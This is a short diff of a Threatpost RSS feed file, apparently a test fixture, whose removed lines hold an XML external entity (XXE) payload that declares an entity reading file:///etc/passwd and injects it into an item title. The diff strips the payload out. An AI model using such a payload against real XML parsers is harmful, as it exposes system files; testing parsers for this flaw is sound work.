@@ -6,8 +6,7 @@
 	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
 	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
 	>
-<!DOCTYPE title [ <!ELEMENT title ANY >
-<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+
 <channel>
 	<title>Threatpost</title>
 	<atom:link href="https://threatpost.com/feed/" rel="self" type="application/rss+xml" />
@@ -21,7 +20,7 @@
 	1	</sy:updateFrequency>
 	<generator>https://wordpress.org/?v=5.2.4</generator>
 <atom:link rel="hub" href="https://pubsubhubbub.appspot.com"/><atom:link rel="hub" href="https://pubsubhubbub.superfeedr.com"/>	<item>
-		<title>&xxe; The Bug Bounty Conflict of Interest</title>
+		<title>123</title>
 		<link>https://threatpost.com/katie-moussouris-the-bug-bounty-conflict-of-interest/152819/</link>
 				<comments>https://threatpost.com/katie-moussouris-the-bug-bounty-conflict-of-interest/152819/#respond</comments>
 				<pubDate>Wed, 12 Feb 2020 14:37:28 +0000</pubDate>
